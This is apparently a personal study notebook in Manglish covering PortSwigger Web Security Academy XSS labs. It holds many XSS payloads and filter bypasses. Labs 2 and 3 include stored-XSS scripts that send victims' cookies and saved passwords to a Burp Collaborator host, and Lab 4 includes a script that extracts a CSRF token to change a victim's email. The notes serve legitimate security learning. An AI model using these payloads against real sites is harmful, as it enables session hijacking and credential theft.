## XSS:
-->You can confirm most kinds of XSS vulnerability by injecting a payload that causes your own browser to execute some arbitrary JavaScript

    Lab-1(Reflected XSS into HTML context with nothing encoded)
-->ivide lab il search functionil reflected xss und
-->so searchil ->`<script>alert(1)</script>` koduth search chythal xss trigger aakum

=============================================================

    Lab-2(Exploiting cross-site scripting to steal cookies)
-->ivide namal stored xss aan chyunath
-->ivide ethengilum blog open chyuka enit comment idanam
-->ithil comment: enna option il ee payload idanam:
 <script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>

enit baaki parameter fill chyth submit chyanam
-->athin shesham collaborator client il poi poll now adichal aa sitel il vere users vanath kanam.so avarude session:cookie eduthit proxy intercept on koduthit home button click chyuka enit athile session: cookie replace chyuka enit forward adichal namal aa user aayi marum.

=============================================================

      Lab-3(Exploiting cross-site scripting to capture passwords)
-->ividem stored xss aan namal chyunath
-->ivide njan lab ile karyam chyunathin mumb just commentil ingane add chyth <script>alert("hai"')</script> test chyth noki.enit veendum aa blog il poyapol ath trigger akunund
-->so ini namuk vendath enthenal chela users avarude password manager il passwords store chyth vekum so ath namuk ee xss vazhi edukanam.ath engane enal namal oru site il login chyumbol athil username,password oke html attribute aaya name="password" ,name="username" enn koduthitundakum.athil aan ath label chyunath.so namal login chythathin shesham inspect->console->il poi document.password ennadichal kanam.ithan namuk vendath
-->so puthiya oru blog il poi ee payload comment aayi add chyanam:

<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">

enit baki parameter fill chyanam.enit post comment click chyuka 
-->ini collaborator il poi poll now adikumbol aa page view chytha users inte password namuk kitum (if it is stored in password manager)
-->athin collaborator il HTTP eduthit request to collaborator edukuka athil undakum aa particular user use chytha request athil thazhe aayi administrator:ozczdu8xsmmkjpqf07hv  enn kanam.aayi

========================================================

    Lab-4( Exploiting XSS to perform CSRF)
-->ivide namal xss combined with csrf use chyth user inte email change chyan sremikunu
-->so aadyam namude credential vech keruka.apol athil update email enna option kanum so ath inspect/view-source chyuka.enit aa req engot pokunu(action="") , athinte csrf token,athinte value ellam study chyuka
-->ith study chyumbol manasilakan patunathenthenal email change chyan passwd venda, pine ee request inte process engane ennal ith /my-account/change-email enna path ilek oru /POST request aan ayakunath with a parameter called "email".ith koodathe ithinte koode csrf token koodi und.
-->==This means your exploit will need to load the user account page, extract the CSRF token, and then use the token to change the victim's email address. ==
-->ithrem karyam manasilakiya sthithik ini nammal logout chyuka enit stored xss ulla sthalam kandethuka,ivide bog post ile comment section.so avide poi comment: il ee payload add chyuka:
       
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>

ini ethengilum oru user ee page visit chythal avante email automatic aayi marum enit test@test.com ennakum
-->ith nadakunathinte pradhana karanam onn xss und,pine email change chyumbol passwd chodikunila.anti-csrf token unden paranjit karyamilla karanam xss undengil aa token kond valya karyamonum ila.ipo just csrf vulnerability marhramanengil ee token kond karyam undayene
-->so aadyam nammal xss undon en nokanam athilengil just csrf vulnerability mathrame chyan patu.athinu ivide csrf token um und
-->ee lab kond manasilakendath enthenal xss+csrf inte power aan

==========================================================

     Lab-5( Stored XSS into HTML context with nothing encoded)
-->ividem lab-1 il chythpole thane aake ulla oru vyathyasam enthenal ith stored xss aan.so search il poi ital aakila.stored means nammal kodukuna input server store chyanam
-->so ivide blog post il comment iduna sthalath stored xss und 
-->so <script>alert("hai")</script> koduth baki name,email oke koduth post comment adikuka.enit thirich athe post il poyal xss trigger chyapedunath kanam

==============================================================

     Lab-6(Reflected XSS into HTML context with most tags and attributes blocked)
-->ivide nammal lab open chyth search il poi <script>alert(1)</script> adikumbol tag is not allowed enn kanikunu
-->so aa request intruder il viduka enit allowed aaya tag cheat sheetil ninum intruder vazhi kandupidikuka
-->aadyam <$tag$> kandupidikuka 
-->then <body%20$attribute$=1> apol namuk ingane kitum:
             <body onresize=alert(1) />  so ith search il search chythit browser resize chythal ee alert pop up chyum
-->ini ith iframe tag il aaki victims in send chyanam:
		`<iframe src="https://your-lab-id.web-security-academy.net/search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`
-->ith koduthit store click chyuka enit deliver to victim koduthal solve aakum
	============================================================

     Lab-7(Reflected XSS into HTML context with all tags blocked except custom ones)
	
-->ivide ella http tags um block chythirikuan.so custum tags use chyth xss chyanam
-->so search request intruderil itt cheatsheet il ninum all tags copy chyth <$tags$> itt payload il paste chyth start attack chythal kanam custum tags 200 enn kanam so nammal <xss > enna tag use chyth script chyam

<script>
location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
	
-->ee script namal exploit server il paste chyanam enit lab id kodukanam.enit search ile value kandile athanu main paylod.so ath url decode chythal correct script kanam. enit store chythit deliver exploit to victim enn adichal lab solve aakum
	
--><xss id=x onfocus=alert(document.cookie) tabindex=1 ></xss>#x';     ithan search kodutha payload url decode chytahl kituka ok

==============================================================
	
	  Lab-8(Reflected XSS with event handlers and href attributes blocked)
-->ivide namal search feature il thane aan chyunath.ithil reflected xss und
-->so namal ee search request intruder il idunu.enit cheatsheet vech ella tags um <$tags$> enn aaki start attack chyunu.ithil a,animate,svg,image,title enna tags oke aakunund.so ith vech namal paylod undakunu.
--><svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a> ithan payload.ith search bar il chyukayanengil ingane thane koduthal mathi.allathe https:// inte koode aanegnil url encode chythit venam send chyendath enn thonunu.ok
-->ingane chyumbol pageil click me enna oru button varum athil click chyumbol ee alert popup chyum
-->svg ennal scalable vector graphics.oru screen pole edukam.athil namuk height,width oke set chyam.athinte ullil animation,anchor tag angen palathum kodukam.ivide payload noki study chytho.
==============================================================
        
	Lab-9(Reflected XSS with some SVG markup allowed)
-->ivide namal search feature il reflected xss kandupidikunu
-->aadyam searchil enthengilum koduth search chyth aa request intruder il iduka
-->enit search=<$tag$> enn koduth ella tags um bruteforce chyuka.apol kanam svg, animatetransform,title,image oke upayogikam enumanasilakam
-->ini <svg>animatetransform%20$events$=1 enn kodukuka.events in enthengilum value undakumallo athukond =1 enn kodukunu
-->enit events oke bruteforce chyunu.apol onbegin enna event 200 OK kanikunu.so ath add chyunu
--><svg><animatetransform onbegin=alert(1);>        so ithan final payload.ith search il poi itt search chythal ee 1 popup chyapedum
	
==============================================================
	
      Lab-10( Reflected XSS into attribute with angle brackets HTML-encoded)
-->ividem namal search feature il aan xss chyunath
-->ivide <> tags idumbol ath automatic aayi &lt; marukayan chyanth
-->athayath <script>alert(1)</script> ennadchal athi view-source il poi nokiyal:
     &lt;script&gt;alert(1)&lt;/script&gt;      ingane aan varunath
-->so ivide <>tags use chyathe xss chyam.karanam <tags> onum avunila
-->so eventhandlers use chyanam ie  
	             "onmouseover="alert(1)    -ee payload koduthit search buttonil hover chyathal xss trigger aakum
	
==============================================================
	
      Lab-11(Stored XSS into anchor href attribute with double quotes HTML-encoded)
-->ivide oru stored xss aan chyunath.blog post il comment post chyuna sthalathan chyunath
-->ivide comment iduna samayath namude website chodikuna parameter und.so athil enthengilum koduth post chyuka.enit aa /post request repeater il viduka
-->enit namal ee itta comments study chyuka.avide namude username inte avide click chyumbol kanam namal kodutha website ilek ath redirect chyapedum
-->aa username inspect chyumbol kanam  href="www.josu.com" enn athnartham namal kodutha webiste input href ilek add chyapedunu ennan.
-->so repeater ilek pokuka enit website=javascript:alert(1)  enn kodukuka so puthiya oru comment add chyum athupole username click chyumbol ee alert pop up chyapedum karanam athinte href il ee xss payload aan set aayirikunath.so ini vere oru user ee namal post chyth undakiyal commentile username il click chythal xss aakum
	
=============================================================
	
	    Lab-12(Reflected XSS in canonical link tag)
-->ivide namal canonical link tag il aan chyunath.ithine pati theroy->general il und
-->so url iil /?%27accesskey=%27x%27onclick=%27alert(1)  ee payload add chyanam
-->so https://your-lab-id.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)  ingne aan payload undavuka.
-->ivide acess key tag upayogich namal x enna key alt+shift+x adikumbol alert(1) trigger chyapedum

=============================================================

	   Lab-13(Reflected XSS into a JavaScript string with single quote and backslash escaped)
-->ivide search il enthengilum search chyuka ie, abcd1234'   ithil kanam namal kodutha input oru javascript code il aan kidakunath
-->athukoodathe '  enna symbol backslash escape aakunu
-->so namuk ee scipt close chyth puthiya script undakam
--></script><script>alert(1)</script> koduth send adichal ee alert trigger aakum
	
==============================================================
	
	   Lab-14 (Reflected XSS into a JavaScript string with angle brackets HTML encoded)
-->ivide srarch il nammal enthengilum search chyuka like <script>alert(1)</script> 
-->enit repeateril nokiyal kanam angle brackets html encoded aayi kidakunath - 
              &lt;script&gt;alert(3)&lt;/script&gt;
-->pine ee type chyuna sathanam oru script inte ullil aayan pokunath so search il  ' josu enn koduthal browser il ath '' josu enn varunund so qoutation onn idumbol athin mumullath automatic aayi varunund
-->so nammal search il    = '-alert(3)-'  / or +,/,   oke - pakaram ittalum popup aakunund
-->ivide ee - (hyphen symbol aakunath enthenal enik correct areela entho NaN pole entho aan)
-->Some useful ways of breaking out of a string literal are:

                     '-alert(document.domain)-' 
                     ';alert(document.domain)//

==============================================================

           Lab-15(Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped)
-->search il xss test chumbol josu'josu enn kodukuka apol single quote string terminate chyunundon nokanam athava terminate chyunundengil ' ittit payload kodukam
-->ivide namal single qoute itt terminate chyan nokumbol (ie, search=josu'josu) backslash \ itt ath escape chyan javascript nokunu ( 'josu\'josu';) 
-->so namal payload il thane \ backslash itt thodangumbol ath escape chyan js in patunila so namal  -->\'-alert(1)//       enn payload koduth chyunu
-->browser il popup aakunund. code il ->'`\\'-alert(1)//`'; ennan kanikuka but ath namal ariyanda

==============================================================

       Lab-16(Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped)
-->ivide comment chyuna sthalath oru stored xss und
-->email : parameter il namal type chyunath oru onclick= enna attribute ilek pokunund
-->namal comment post chyth email oke koduth kazhinjal matullavark namude aa comment chytha sthalath namude name und aa name il click chythal namude email ilek pokuna reethiyan ullath so aa pathil nammal oru stored xss chyunu apol matullavar click chyumbol ee xss trigger chyapedum
-->ivide namal aaduam /POST request il comment send chyunu so aa request repeater il vittu send adichal 200ok enn kanam ini browser il go back adich aa same post refresh chyuka apol namuk aa page il namal adicha comment oke kanalo so aa request um repeater il viduk enit namal type chytha comment study chyuka.athil email il namal type chytha sambavam
-->so nammal   ->http://foo?&apos;-alert(1)-&apos;    enna url email: parameter il kodukunu apol ee url alert call chyum enit comment submit chyuka
-->ini aarengilum ee comment ile username il click chythal xss aakum
==============================================================

        lab-17(Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped)
-->ivide search bar il reflected xss und
-->enthengilum adich burp il poi nokuka.repeater il response il nokiyal kanam namal adich sathanam oru script inte ullil aan kidakunath
-->search=<josujos'jos'josu>   ingane enthengilum koduth search chyuka apol response il kanam  -> \u003cjos\u0027u1234\u0027jso\u003e   .sambavam ee symbols oke unicode charecter aayi encode chythirikukayaan
-->so ->${alert(1)}      ee payload kodukumbol alert aakunund

==============================================================

     Lab-18(DOM XSS in `document.write` sink using source `location.search`
-->DOM ennath javascript in pala karyangal/actions nadathanayit ulla oru model aan
-->location.search ennal namal oru karyam browser il search chyunu ie,https://www.bing.com/search?PC=YA02&FORM=YASBRD&q=google   ivide ee ? in shesham varuna parameter query oke aan ee location.search ennan ivan parayunath
-->ivide namal search chyuna sathanam inspect element chyth searchil typechythnokumbol (ie,josu123) rand sthalath kanan patunund onn page il reflect aakunath randamatheth image tag il append aayikidakunumund  <img src="/resources/images/tracker.gif?searchTerms=josu123"> 
-->so namuk search il -># "><script>alert(3)</script>  ee payload kodukam apol ith imag tag il serchTerms enna parameter il append aayi search nadann kazhiyumbol xss trigger aayikolum

==============================================================

     Lab-19(DOM XSS in `document.write` sink using source `location.search` inside a select element)
-->ivde oru product click chythit next page il stock check chyuna option und
-->aa sambavam inspect chyumbol kanam oru select tag inte ullil aayan moon location koduthirikunath.aa select tag in name=storeid enn und
-->so namal ithinte javascript code nokiyal kanam ee storeid aan js fetch chyan use chyunath. ith engane aan chyunathenal :
                 var store = (new URLSearchParams(window.location.search)).get('storeId');
                         enna code upayogichan
-->so namal enth chyunun ennal ee page inte url nokiyal kanam  :   https://0a7b0059033970bec0260155002f004e.web-security-academy.net/product?productId=1 enn .so namal storeid enna oru parameter koodi add chyunu.karanam js code nokiyal kanam location.search il ninuman storeid fetch chyunath
--> so ....product?productId=1&storeId=josu123
-->ipol ith aa select box il varum
-->ini html tag nokiyal kanam ith first select tag use chyunund pine options tag use chynund so Id=1&storeId=</select></option>josu12345 enn koduthal aa boxil ninum purath varum namal type chythtath 
-->so storeId="></select><img%20src=1%20onerror=alert(1)>  enn xss kodukam but njan vere reethiyil chythapozhum xss ayi ie storeId=</select></option><script>alert(3)</script>

==============================================================

      Lab-20(DOM XSS in `innerHTML` sink using source `location.search`)
-->ivide namal search il <script>alert(3)</script> enn kodukumbol ith aakunumil athupole script ennath block um chyunu screenil aa word polum kanikunila
-->namal ee search chyth result kitiya page view-source adikumbol athil javascript code ingane kanam:    document.getElementById('searchMessage').innerHTML = query;    so ivide nama type chyuna search word .innerHTML vech entho chyunu
-->.innerHTML undakumbol namuk script tag svg tag onum aavila polum apol namal mattu tags test chyth nokanam
-->so ivide img tag aakunund  so -> <img src="x" onerror=alert(4) >   enn kodukumbol alert aakunund

==============================================================

       Lab-21(DOM XSS in jQuery anchor `href` attribute sink using `location.search` source)
-->ivide jquery use chyunund.jquery code aan namal feedback submit chyunath send chyunath en thonun
-->ivide feedback page il .....edback?returnPath=/   enan url ullath so aa returnPathil =josu enn koduth enit aa page il thane back enn button und ath click chythal back ile page ilek pokum. but ivide josu enn koduthathkond aa back button inte endpoint josu enn aayi 
-->so namal aa parameter il enthengilum url koduthal back button click chyumbol openredirect nadakum but namal athil oru xss payload kodukunu apol athil xss nadakum
-->id .....edback?returnPath=javascript:alert(2) enn koduth send chyuka
-->ini back button click chyumbol ee xss popup aakum

==============================================================

      Lab-22(DOM XSS in jQuery selector sink using a hashchange event)
-->ithoke jquery type xss aan njan nokunila aduthathilek kadakam

==============================================================

     Lab-23()